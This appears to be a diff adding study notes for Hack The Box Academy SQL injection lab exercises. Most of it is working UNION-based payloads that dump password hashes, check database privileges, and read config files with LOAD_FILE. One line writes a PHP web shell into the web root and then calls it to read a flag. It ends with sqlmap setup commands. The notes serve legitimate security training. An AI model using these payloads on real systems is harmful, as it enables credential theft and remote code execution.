@@ -160,3 +160,33 @@ SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments;
 "What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"
 foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
 foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
+----------------------------
+"We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password."
+foo' UNION SELECT 1,user(),3,4-- -
+foo' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+foo' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
+---------------------------
+
+"Find the flag by using a webshell."
+foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+http://STMIP:STMPO/shell.php?cmd=cat%20../flag.txt
+-----------------------------
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+--------------------------
+Input Validation
+https://academy.hackthebox.com/module/33/section/794
+
+============================
+ sudo apt install sqlmap
+  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+--------------------
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
